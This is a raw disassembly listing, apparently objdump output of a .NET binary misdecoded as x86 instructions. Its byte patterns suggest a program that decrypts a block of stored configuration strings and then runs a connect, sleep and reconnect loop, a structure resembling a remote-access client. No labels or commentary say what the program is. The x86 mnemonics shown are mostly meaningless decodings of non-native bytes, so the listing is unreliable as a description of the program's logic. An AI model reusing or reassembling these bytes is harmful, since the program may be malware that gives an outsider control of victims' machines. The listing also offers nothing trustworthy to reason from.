  4025cc:	00 00                	add    %al,(%eax)
  4025ce:	0a 80 3b 00 00 04    	or     0x400003b(%eax),%al
  4025d4:	2a 5e 02             	sub    0x2(%esi),%bl
  4025d7:	28 1b                	sub    %bl,(%ebx)
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	0a 03                	or     (%ebx),%al
  4025dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4025de:	21 00                	and    %eax,(%eax)
  4025e0:	00 0a                	add    %cl,(%edx)
  4025e2:	28 99 00 00 06 28    	sub    %bl,0x28060000(%ecx)
  4025e8:	fb                   	sti
  4025e9:	00 00                	add    %al,(%eax)
  4025eb:	0a 2a                	or     (%edx),%ch
  4025ed:	5e                   	pop    %esi
  4025ee:	28 1b                	sub    %bl,(%ebx)
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	0a 02                	or     (%edx),%al
  4025f4:	03 28                	add    (%eax),%ebp
  4025f6:	1c 00                	sbb    $0x0,%al
  4025f8:	00 0a                	add    %cl,(%edx)
  4025fa:	28 9b 00 00 06 6f    	sub    %bl,0x6f060000(%ebx)
  402600:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402605:	62 1f                	bound  %ebx,(%edi)
  402607:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40260d:	25 d0 44 00 00       	and    $0x44d0,%eax
  402612:	04 28                	add    $0x28,%al
  402614:	78 00                	js     0x402616
  402616:	00 0a                	add    %cl,(%edx)
  402618:	80 43 00 00          	addb   $0x0,0x0(%ebx)
  40261c:	04 2a                	add    $0x2a,%al
  40261e:	00 00                	add    %al,(%eax)
  402620:	1b 30                	sbb    (%eax),%esi
  402622:	03 00                	add    (%eax),%eax
  402624:	b5 00                	mov    $0x0,%ch
  402626:	00 00                	add    %al,(%eax)
  402628:	01 00                	add    %eax,(%eax)
  40262a:	00 11                	add    %dl,(%ecx)
  40262c:	16                   	push   %ss
  40262d:	0a 2b                	or     (%ebx),%ch
  40262f:	0e                   	push   %cs
  402630:	20 e8                	and    %ch,%al
  402632:	03 00                	add    (%eax),%eax
  402634:	00 28                	add    %ch,(%eax)
  402636:	14 00                	adc    $0x0,%al
  402638:	00 0a                	add    %cl,(%edx)
  40263a:	06                   	push   %es
  40263b:	17                   	pop    %ss
  40263c:	58                   	pop    %eax
  40263d:	0a 06                	or     (%esi),%al
  40263f:	7e 11                	jle    0x402652
  402641:	00 00                	add    %al,(%eax)
  402643:	04 28                	add    $0x28,%al
  402645:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  40264a:	e5 28                	in     $0x28,%eax
  40264c:	03 00                	add    (%eax),%eax
  40264e:	00 06                	add    %al,(%esi)
  402650:	2d 06 16 28 16       	sub    $0x16281606,%eax
  402655:	00 00                	add    %al,(%eax)
  402657:	0a 00                	or     (%eax),%al
  402659:	28 87 00 00 06 2d    	sub    %al,0x2d060000(%edi)
  40265f:	06                   	push   %es
  402660:	16                   	push   %ss
  402661:	28 16                	sub    %dl,(%esi)
  402663:	00 00                	add    %al,(%eax)
  402665:	0a 7e 0c             	or     0xc(%esi),%bh
  402668:	00 00                	add    %al,(%eax)
  40266a:	04 28                	add    $0x28,%al
  40266c:	17                   	pop    %ss
  40266d:	00 00                	add    %al,(%eax)
  40266f:	0a 2c 05 28 72 00 00 	or     0x7228(,%eax,1),%ch
  402676:	06                   	push   %es
  402677:	7e 04                	jle    0x40267d
  402679:	00 00                	add    %al,(%eax)
  40267b:	04 28                	add    $0x28,%al
  40267d:	17                   	pop    %ss
  40267e:	00 00                	add    %al,(%eax)
  402680:	0a 2c 05 28 70 00 00 	or     0x7028(,%eax,1),%ch
  402687:	06                   	push   %es
  402688:	7e 0f                	jle    0x402699
  40268a:	00 00                	add    %al,(%eax)
  40268c:	04 28                	add    $0x28,%al
  40268e:	17                   	pop    %ss
  40268f:	00 00                	add    %al,(%eax)
  402691:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402694:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  40269a:	05 28 8a 00 00       	add    $0x8a28,%eax
  40269f:	06                   	push   %es
  4026a0:	28 86 00 00 06 73    	sub    %al,0x73060000(%esi)
  4026a6:	7d 00                	jge    0x4026a8
  4026a8:	00 06                	add    %al,(%esi)
  4026aa:	28 7b 00             	sub    %bh,0x0(%ebx)
  4026ad:	00 06                	add    %al,(%esi)
  4026af:	26 de 03             	fiadds %es:(%ebx)
  4026b2:	26 de 00             	fiadds %es:(%eax)
  4026b5:	28 12                	sub    %dl,(%edx)
  4026b7:	00 00                	add    %al,(%eax)
  4026b9:	06                   	push   %es
  4026ba:	2d 0a 28 1c 00       	sub    $0x1c280a,%eax
  4026bf:	00 06                	add    %al,(%esi)
  4026c1:	28 19                	sub    %bl,(%ecx)
  4026c3:	00 00                	add    %al,(%eax)
  4026c5:	06                   	push   %es
  4026c6:	73 18                	jae    0x4026e0
  4026c8:	00 00                	add    %al,(%eax)
  4026ca:	0a 20                	or     (%eax),%ah
  4026cc:	e8 03 00 00 20       	call   0x204026d4
  4026d1:	88 13                	mov    %dl,(%ebx)
  4026d3:	00 00                	add    %al,(%eax)
  4026d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d6:	19 00                	sbb    %eax,(%eax)
  4026d8:	00 0a                	add    %cl,(%edx)
  4026da:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026dd:	00 0a                	add    %cl,(%edx)
  4026df:	2b d4                	sub    %esp,%edx
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	00 01                	add    %al,(%ecx)
  4026e5:	10 00                	adc    %al,(%eax)
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	00 2d 00 59 86 00    	add    %ch,0x865900
  4026ef:	03 01                	add    (%ecx),%eax
  4026f1:	00 00                	add    %al,(%eax)
  4026f3:	01 1b                	add    %ebx,(%ebx)
  4026f5:	30 02                	xor    %al,(%edx)
  4026f7:	00 13                	add    %dl,(%ebx)
  4026f9:	01 00                	add    %eax,(%eax)
  4026fb:	00 02                	add    %al,(%edx)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	11 28                	adc    %ebp,(%eax)
  402701:	1b 00                	sbb    (%eax),%eax
  402703:	00 0a                	add    %cl,(%edx)
  402705:	7e 07                	jle    0x40270e
  402707:	00 00                	add    %al,(%eax)
  402709:	04 28                	add    $0x28,%al
  40270b:	1c 00                	sbb    $0x0,%al
  40270d:	00 0a                	add    %cl,(%edx)
  40270f:	6f                   	outsl  %ds:(%esi),(%dx)
  402710:	1d 00 00 0a 80       	sbb    $0x800a0000,%eax
  402715:	07                   	pop    %es
  402716:	00 00                	add    %al,(%eax)
  402718:	04 7e                	add    $0x7e,%al
  40271a:	07                   	pop    %es
  40271b:	00 00                	add    %al,(%eax)
  40271d:	04 73                	add    $0x73,%al
  40271f:	97                   	xchg   %eax,%edi
  402720:	00 00                	add    %al,(%eax)
  402722:	06                   	push   %es
  402723:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272a:	00 00                	add    %al,(%eax)
  40272c:	04 7e                	add    $0x7e,%al
  40272e:	01 00                	add    %eax,(%eax)
  402730:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402733:	9a 00 00 06 80 01 00 	lcall  $0x1,$0x80060000
  40273a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40273d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402742:	02 00                	add    (%eax),%al
  402744:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402747:	9a 00 00 06 80 02 00 	lcall  $0x2,$0x80060000
  40274e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402751:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402756:	03 00                	add    (%eax),%eax
  402758:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275b:	9a 00 00 06 80 03 00 	lcall  $0x3,$0x80060000
  402762:	00 04 7e             	add    %al,(%esi,%edi,2)
  402765:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276a:	04 00                	add    $0x0,%al
  40276c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40276f:	9a 00 00 06 80 04 00 	lcall  $0x4,$0x80060000
  402776:	00 04 7e             	add    %al,(%esi,%edi,2)
  402779:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40277e:	08 00                	or     %al,(%eax)
  402780:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402783:	9a 00 00 06 80 08 00 	lcall  $0x8,$0x80060000
  40278a:	00 04 7e             	add    %al,(%esi,%edi,2)
  40278d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402792:	0e                   	push   %cs
  402793:	00 00                	add    %al,(%eax)
  402795:	04 6f                	add    $0x6f,%al
  402797:	9a 00 00 06 80 0e 00 	lcall  $0xe,$0x80060000
  40279e:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a1:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027a6:	0c 00                	or     $0x0,%al
  4027a8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027ab:	9a 00 00 06 80 0c 00 	lcall  $0xc,$0x80060000
  4027b2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027b5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ba:	0f 00 00             	sldt   (%eax)
  4027bd:	04 6f                	add    $0x6f,%al
  4027bf:	9a 00 00 06 80 0f 00 	lcall  $0xf,$0x80060000
  4027c6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027c9:	7e 00                	jle    0x4027cb
  4027cb:	00 06                	add    %al,(%esi)
  4027cd:	80 10 00             	adcb   $0x0,(%eax)
  4027d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027d3:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d8:	0a 00                	or     (%eax),%al
  4027da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027dd:	9a 00 00 06 80 0a 00 	lcall  $0xa,$0x80060000
  4027e4:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027e7:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027ec:	09 00                	or     %eax,(%eax)
  4027ee:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f1:	9a 00 00 06 28 1c 00 	lcall  $0x1c,$0x28060000
  4027f8:	00 0a                	add    %cl,(%edx)
  4027fa:	73 1e                	jae    0x40281a
  4027fc:	00 00                	add    %al,(%eax)
  4027fe:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  402804:	28 04 00             	sub    %al,(%eax,%eax,1)
  402807:	00 06                	add    %al,(%esi)
  402809:	0a de                	or     %dh,%bl
  40280b:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402810:	00 06                	add    %al,(%esi)
  402812:	2a 00                	sub    (%eax),%al
  402814:	41                   	inc    %ecx
  402815:	1c 00                	sbb    $0x0,%al
	...
  40281f:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  402822:	00 00                	add    %al,(%eax)
  402824:	0c 01                	or     $0x1,%al
  402826:	00 00                	add    %al,(%eax)
  402828:	05 00 00 00 01       	add    $0x1000000,%eax
  40282d:	00 00                	add    %al,(%eax)
  40282f:	01 1b                	add    %ebx,(%ebx)
  402831:	30 04 00             	xor    %al,(%eax,%eax,1)
  402834:	4b                   	dec    %ebx
  402835:	00 00                	add    %al,(%eax)
  402837:	00 02                	add    %al,(%edx)
  402839:	00 00                	add    %al,(%eax)
  40283b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40283e:	00 00                	add    %al,(%eax)
  402840:	04 6f                	add    $0x6f,%al
  402842:	1f                   	pop    %ds
  402843:	00 00                	add    %al,(%eax)
  402845:	0a 6f 20             	or     0x20(%edi),%ch
  402848:	00 00                	add    %al,(%eax)
  40284a:	0a 74 30 00          	or     0x0(%eax,%esi,1),%dh
  40284e:	00 01                	add    %al,(%ecx)
  402850:	28 1b                	sub    %bl,(%ebx)
  402852:	00 00                	add    %al,(%eax)
  402854:	0a 7e 07             	or     0x7(%esi),%bh
  402857:	00 00                	add    %al,(%eax)
  402859:	04 6f                	add    $0x6f,%al
  40285b:	21 00                	and    %eax,(%eax)
  40285d:	00 0a                	add    %cl,(%edx)
  40285f:	28 9f 00 00 06 72    	sub    %bl,0x72060000(%edi)
  402865:	01 00                	add    %eax,(%eax)
  402867:	00 70 28             	add    %dh,0x28(%eax)
  40286a:	22 00                	and    (%eax),%al
  40286c:	00 0a                	add    %cl,(%edx)
  40286e:	7e 0a                	jle    0x40287a
  402870:	00 00                	add    %al,(%eax)
  402872:	04 28                	add    $0x28,%al
  402874:	1c 00                	sbb    $0x0,%al
  402876:	00 0a                	add    %cl,(%edx)
  402878:	6f                   	outsl  %ds:(%esi),(%dx)
  402879:	23 00                	and    (%eax),%eax
  40287b:	00 0a                	add    %cl,(%edx)
  40287d:	0a de                	or     %dh,%bl
  40287f:	05 26 16 0a de       	add    $0xde0a1626,%eax
  402884:	00 06                	add    %al,(%esi)
  402886:	2a 00                	sub    (%eax),%al
  402888:	01 10                	add    %edx,(%eax)
  40288a:	00 00                	add    %al,(%eax)
  40288c:	00 00                	add    %al,(%eax)
  40288e:	00 00                	add    %al,(%eax)
  402890:	44                   	inc    %esp
  402891:	44                   	inc    %esp
  402892:	00 05 32 00 00 01    	add    %al,0x1000032
  402898:	13 30                	adc    (%eax),%esi
  40289a:	01 00                	add    %eax,(%eax)
  40289c:	97                   	xchg   %eax,%edi
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 00                	add    %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 72 0f             	add    %dh,0xf(%edx)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	70 80                	jo     0x40282a
  4028aa:	01 00                	add    %eax,(%eax)
  4028ac:	00 04 72             	add    %al,(%edx,%esi,2)
  4028af:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028b6:	00 04 72             	add    %al,(%edx,%esi,2)
  4028b9:	1d 02 00 70 80       	sbb    $0x80700002,%eax
  4028be:	03 00                	add    (%eax),%eax
  4028c0:	00 04 72             	add    %al,(%edx,%esi,2)
  4028c3:	d0 02                	rolb   $1,(%edx)
  4028c5:	00 70 80             	add    %dh,-0x80(%eax)
  4028c8:	04 00                	add    $0x0,%al
  4028ca:	00 04 72             	add    %al,(%edx,%esi,2)
  4028cd:	83 03 00             	addl   $0x0,(%ebx)
  4028d0:	70 80                	jo     0x402852
  4028d2:	05 00 00 04 72       	add    $0x72040000,%eax
  4028d7:	97                   	xchg   %eax,%edi
  4028d8:	03 00                	add    (%eax),%eax
  4028da:	70 80                	jo     0x40285c
  4028dc:	06                   	push   %es
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	04 72                	add    $0x72,%al
  4028e1:	b9 03 00 70 80       	mov    $0x80700003,%ecx
  4028e6:	07                   	pop    %es
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	04 72                	add    $0x72,%al
  4028eb:	13 04 00             	adc    (%eax,%eax,1),%eax
  4028ee:	70 80                	jo     0x402870
  4028f0:	08 00                	or     %al,(%eax)
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	c6 04 00 70          	movb   $0x70,(%eax,%eax,1)
  4028f9:	80 09 00             	orb    $0x0,(%ecx)
  4028fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4028ff:	21 17                	and    %edx,(%edi)
  402901:	00 70 80             	add    %dh,-0x80(%eax)
  402904:	0a 00                	or     (%eax),%al
  402906:	00 04 72             	add    %al,(%edx,%esi,2)
  402909:	d4 1e                	aam    $0x1e
  40290b:	00 70 80             	add    %dh,-0x80(%eax)
  40290e:	0c 00                	or     $0x0,%al
  402910:	00 04 72             	add    %al,(%edx,%esi,2)
  402913:	87 1f                	xchg   %ebx,(%edi)
  402915:	00 70 80             	add    %dh,-0x80(%eax)
  402918:	0e                   	push   %cs
  402919:	00 00                	add    %al,(%eax)
  40291b:	04 72                	add    $0x72,%al
  40291d:	3a 20                	cmp    (%eax),%ah
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	0f 00 00             	sldt   (%eax)
  402925:	04 72                	add    $0x72,%al
  402927:	ed                   	in     (%dx),%eax
  402928:	20 00                	and    %al,(%eax)
  40292a:	70 80                	jo     0x4028ac
  40292c:	10 00                	adc    %al,(%eax)
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	ef                   	out    %eax,(%dx)
  402932:	20 00                	and    %al,(%eax)
  402934:	70 80                	jo     0x4028b6
  402936:	11 00                	adc    %eax,(%eax)
  402938:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40293b:	00 1b                	add    %bl,(%ebx)
  40293d:	30 07                	xor    %al,(%edi)
  40293f:	00 9e 02 00 00 03    	add    %bl,0x3000002(%esi)
  402945:	00 00                	add    %al,(%eax)
  402947:	11 18                	adc    %ebx,(%eax)
  402949:	17                   	pop    %ss
  40294a:	1c 73                	sbb    $0x73,%al
  40294c:	24 00                	and    $0x0,%al
  40294e:	00 0a                	add    %cl,(%edx)
  402950:	25 20 00 c8 00       	and    $0xc80020,%eax
  402955:	00 6f 25             	add    %ch,0x25(%edi)
  402958:	00 00                	add    %al,(%eax)
  40295a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402960:	00 6f 26             	add    %ch,0x26(%edi)
  402963:	00 00                	add    %al,(%eax)
  402965:	0a 28                	or     (%eax),%ch
  402967:	07                   	pop    %es
  402968:	00 00                	add    %al,(%eax)
  40296a:	06                   	push   %es
  40296b:	7e 0e                	jle    0x40297b
  40296d:	00 00                	add    %al,(%eax)
  40296f:	04 72                	add    $0x72,%al
  402971:	f3 20 00             	repz and %al,(%eax)
  402974:	70 28                	jo     0x40299e
  402976:	27                   	daa
  402977:	00 00                	add    %al,(%eax)
  402979:	0a 39                	or     (%ecx),%bh
  40297b:	d0 00                	rolb   $1,(%eax)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	7e 02                	jle    0x402983
  402981:	00 00                	add    %al,(%eax)
  402983:	04 17                	add    $0x17,%al
  402985:	8d 3a                	lea    (%edx),%edi
  402987:	00 00                	add    %al,(%eax)
  402989:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40298f:	6f                   	outsl  %ds:(%esi),(%dx)
  402990:	28 00                	sub    %al,(%eax)
  402992:	00 0a                	add    %cl,(%edx)
  402994:	73 18                	jae    0x4029ae
  402996:	00 00                	add    %al,(%eax)
  402998:	0a 7e 02             	or     0x2(%esi),%bh
  40299b:	00 00                	add    %al,(%eax)
  40299d:	04 17                	add    $0x17,%al
  40299f:	8d 3a                	lea    (%edx),%edi
  4029a1:	00 00                	add    %al,(%eax)
  4029a3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029aa:	28 00                	sub    %al,(%eax)
  4029ac:	00 0a                	add    %cl,(%edx)
  4029ae:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029b1:	29 00                	sub    %eax,(%eax)
  4029b3:	00 0a                	add    %cl,(%edx)
  4029b5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029bc:	17                   	pop    %ss
  4029bd:	8d 3a                	lea    (%edx),%edi
  4029bf:	00 00                	add    %al,(%eax)
  4029c1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c8:	28 00                	sub    %al,(%eax)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	73 18                	jae    0x4029e6
  4029ce:	00 00                	add    %al,(%eax)
  4029d0:	0a 7e 01             	or     0x1(%esi),%bh
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	04 17                	add    $0x17,%al
  4029d7:	8d 3a                	lea    (%edx),%edi
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4029e2:	28 00                	sub    %al,(%eax)
  4029e4:	00 0a                	add    %cl,(%edx)
  4029e6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4029e9:	29 00                	sub    %eax,(%eax)
  4029eb:	00 0a                	add    %cl,(%edx)
  4029ed:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  4029f4:	06                   	push   %es
  4029f5:	28 1a                	sub    %bl,(%edx)
  4029f7:	00 00                	add    %al,(%eax)
  4029f9:	06                   	push   %es
  4029fa:	2c 42                	sub    $0x42,%al
  4029fc:	06                   	push   %es
  4029fd:	28 2a                	sub    %ch,(%edx)
  4029ff:	00 00                	add    %al,(%eax)
  402a01:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a04:	0d 2b 2c 08 09       	or     $0x9082c2b,%eax
  402a09:	9a 13 04 28 06 00 00 	lcall  $0x0,$0x6280413
  402a10:	06                   	push   %es
  402a11:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a14:	6f                   	outsl  %ds:(%esi),(%dx)
  402a15:	2b 00                	sub    (%eax),%eax
  402a17:	00 0a                	add    %cl,(%edx)
  402a19:	28 06                	sub    %al,(%esi)
  402a1b:	00 00                	add    %al,(%eax)
  402a1d:	06                   	push   %es
  402a1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a1f:	2c 00                	sub    $0x0,%al
  402a21:	00 0a                	add    %cl,(%edx)
  402a23:	2c 05                	sub    $0x5,%al
  402a25:	dd af 00 00 00 de    	(bad) -0x22000000(%edi)
  402a2b:	03 26                	add    (%esi),%esp
  402a2d:	de 00                	fiadds (%eax)
  402a2f:	09 17                	or     %edx,(%edi)
  402a31:	58                   	pop    %eax
  402a32:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a37:	32 ce                	xor    %dh,%cl
  402a39:	38 9b 00 00 00 28    	cmp    %bl,0x28000000(%ebx)
  402a3f:	06                   	push   %es
  402a40:	00 00                	add    %al,(%eax)
  402a42:	06                   	push   %es
  402a43:	06                   	push   %es
  402a44:	07                   	pop    %es
  402a45:	6f                   	outsl  %ds:(%esi),(%dx)
  402a46:	2d 00 00 0a 38       	sub    $0x380a0000,%eax
  402a4b:	8a 00                	mov    (%eax),%al
  402a4d:	00 00                	add    %al,(%eax)
  402a4f:	73 2e                	jae    0x402a7f
  402a51:	00 00                	add    %al,(%eax)
  402a53:	0a 13                	or     (%ebx),%dl
  402a55:	05 72 ed 20 00       	add    $0x20ed72,%eax
  402a5a:	70 72                	jo     0x402ace
  402a5c:	ed                   	in     (%dx),%eax
  402a5d:	20 00                	and    %al,(%eax)
  402a5f:	70 73                	jo     0x402ad4
  402a61:	2f                   	das
  402a62:	00 00                	add    %al,(%eax)
  402a64:	0a 13                	or     (%ebx),%dl
  402a66:	06                   	push   %es
  402a67:	11 05 11 06 6f 30    	adc    %eax,0x306f0611
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0a 11                	or     (%ecx),%dl
  402a71:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402a76:	04 6f                	add    $0x6f,%al
  402a78:	31 00                	xor    %eax,(%eax)
  402a7a:	00 0a                	add    %cl,(%edx)
  402a7c:	17                   	pop    %ss
  402a7d:	8d 39                	lea    (%ecx),%edi
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	01 25 16 72 fd 20    	add    %esp,0x20fd7216
  402a87:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a8a:	16                   	push   %ss
  402a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a8c:	32 00                	xor    (%eax),%al
  402a8e:	00 0a                	add    %cl,(%edx)
  402a90:	13 07                	adc    (%edi),%eax
  402a92:	11 07                	adc    %eax,(%edi)
  402a94:	16                   	push   %ss
  402a95:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  402a9c:	07                   	pop    %es
  402a9d:	73 18                	jae    0x402ab7
  402a9f:	00 00                	add    %al,(%eax)
  402aa1:	0a 17                	or     (%edi),%dl
  402aa3:	11 07                	adc    %eax,(%edi)
  402aa5:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aa8:	19 00                	sbb    %eax,(%eax)
  402aaa:	00 0a                	add    %cl,(%edx)
  402aac:	9a 80 01 00 00 04 28 	lcall  $0x2804,$0x180
  402ab3:	06                   	push   %es
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	06                   	push   %es
  402ab7:	7e 02                	jle    0x402abb
  402ab9:	00 00                	add    %al,(%eax)
  402abb:	04 7e                	add    $0x7e,%al
  402abd:	01 00                	add    %eax,(%eax)
  402abf:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ac2:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402ac7:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  402acc:	0c 11                	or     $0x11,%al
  402ace:	05 2c 07 11 05       	add    $0x511072c,%eax
  402ad3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ad4:	33 00                	xor    (%eax),%eax
  402ad6:	00 0a                	add    %cl,(%edx)
  402ad8:	dc 28                	fsubrl (%eax)
  402ada:	06                   	push   %es
  402adb:	00 00                	add    %al,(%eax)
  402add:	06                   	push   %es
  402ade:	6f                   	outsl  %ds:(%esi),(%dx)
  402adf:	2c 00                	sub    $0x0,%al
  402ae1:	00 0a                	add    %cl,(%edx)
  402ae3:	39 ec                	cmp    %ebp,%esp
  402ae5:	00 00                	add    %al,(%eax)
  402ae7:	00 17                	add    %dl,(%edi)
  402ae9:	28 13                	sub    %dl,(%ebx)
  402aeb:	00 00                	add    %al,(%eax)
  402aed:	06                   	push   %es
  402aee:	28 06                	sub    %al,(%esi)
  402af0:	00 00                	add    %al,(%eax)
  402af2:	06                   	push   %es
  402af3:	17                   	pop    %ss
  402af4:	73 34                	jae    0x402b2a
  402af6:	00 00                	add    %al,(%eax)
  402af8:	0a 16                	or     (%esi),%dl
  402afa:	14 fe                	adc    $0xfe,%al
  402afc:	06                   	push   %es
  402afd:	1b 00                	sbb    (%eax),%eax
  402aff:	00 06                	add    %al,(%esi)
  402b01:	73 35                	jae    0x402b38
  402b03:	00 00                	add    %al,(%eax)
  402b05:	0a 73 36             	or     0x36(%ebx),%dh
  402b08:	00 00                	add    %al,(%eax)
  402b0a:	0a 28                	or     (%eax),%ch
  402b0c:	09 00                	or     %eax,(%eax)
  402b0e:	00 06                	add    %al,(%esi)
  402b10:	28 08                	sub    %cl,(%eax)
  402b12:	00 00                	add    %al,(%eax)
  402b14:	06                   	push   %es
  402b15:	28 06                	sub    %al,(%esi)
  402b17:	00 00                	add    %al,(%eax)
  402b19:	06                   	push   %es
  402b1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1b:	37                   	aaa
  402b1c:	00 00                	add    %al,(%eax)
  402b1e:	0a 6f 38             	or     0x38(%edi),%ch
  402b21:	00 00                	add    %al,(%eax)
  402b23:	0a 17                	or     (%edi),%dl
  402b25:	8d 3a                	lea    (%edx),%edi
  402b27:	00 00                	add    %al,(%eax)
  402b29:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	28 00                	sub    %al,(%eax)
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	16                   	push   %ss
  402b35:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402b3c:	16                   	push   %ss
  402b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3e:	39 00                	cmp    %eax,(%eax)
  402b40:	00 0a                	add    %cl,(%edx)
  402b42:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b45:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b4a:	0c 00                	or     $0x0,%al
  402b4c:	00 06                	add    %al,(%esi)
  402b4e:	d4 8d                	aam    $0x8d
  402b50:	44                   	inc    %esp
  402b51:	00 00                	add    %al,(%eax)
  402b53:	01 28                	add    %ebp,(%eax)
  402b55:	0b 00                	or     (%eax),%eax
  402b57:	00 06                	add    %al,(%esi)
  402b59:	16                   	push   %ss
  402b5a:	6a 28                	push   $0x28
  402b5c:	0f 00 00             	sldt   (%eax)
  402b5f:	06                   	push   %es
  402b60:	28 80 00 00 06 28    	sub    %al,0x28060000(%eax)
  402b66:	1e                   	push   %ds
  402b67:	00 00                	add    %al,(%eax)
  402b69:	06                   	push   %es
  402b6a:	14 fe                	adc    $0xfe,%al
  402b6c:	06                   	push   %es
  402b6d:	1f                   	pop    %ds
  402b6e:	00 00                	add    %al,(%eax)
  402b70:	06                   	push   %es
  402b71:	73 3a                	jae    0x402bad
  402b73:	00 00                	add    %al,(%eax)
  402b75:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402b78:	18 00                	sbb    %al,(%eax)
  402b7a:	00 0a                	add    %cl,(%edx)
  402b7c:	20 98 3a 00 00 20    	and    %bl,0x2000003a(%eax)
  402b82:	30 75 00             	xor    %dh,0x0(%ebp)
  402b85:	00 6f 19             	add    %ch,0x19(%edi)
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 73 18             	or     0x18(%ebx),%dh
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	0a 20                	or     (%eax),%ah
  402b91:	98                   	cwtl
  402b92:	3a 00                	cmp    (%eax),%al
  402b94:	00 20                	add    %ah,(%eax)
  402b96:	60                   	pusha
  402b97:	ea 00 00 6f 19 00 00 	ljmp   $0x0,$0x196f0000
  402b9e:	0a 73 3b             	or     0x3b(%ebx),%dh
  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	0a 28                	or     (%eax),%ch
  402ba5:	11 00                	adc    %eax,(%eax)
  402ba7:	00 06                	add    %al,(%esi)
